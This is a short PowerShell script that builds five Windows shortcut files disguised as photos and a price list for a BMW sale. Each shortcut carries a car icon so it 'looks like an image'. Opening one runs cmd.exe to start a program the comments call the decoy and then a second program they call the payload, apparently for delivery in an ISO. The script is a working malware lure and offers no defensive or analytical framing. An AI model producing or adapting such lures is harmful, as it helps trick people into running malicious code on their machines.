﻿cd C:\BMW_Sale_ISO

$lnkSpecs = @(
    "bmw_front_view.png.lnk",
    "bmw_interior_view.png.lnk",
    "bmw_price_list.jpg.lnk",
    "bmw_service_history.png.lnk",
    "bmw_keys_photos.jpg.lnk"
)

$WshShell = New-Object -ComObject WScript.Shell

foreach ($name in $lnkSpecs) {
    $shortcutPath = Join-Path (Get-Location) $name
    $shortcut = $WshShell.CreateShortcut($shortcutPath)

    # Target: cmd.exe
    $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"

    # Arguments: launch BMWView (decoy) then BMWUpdate (payload)
    $shortcut.Arguments = '/c "BMWView.exe & BMWUpdate.exe"'

    # Working directory = current folder (ISO root)
    $shortcut.WorkingDirectory = (Get-Location).Path

    # Use car.ico as icon so it looks like an image
    $shortcut.IconLocation = ".\car.ico"

    $shortcut.Save()
}
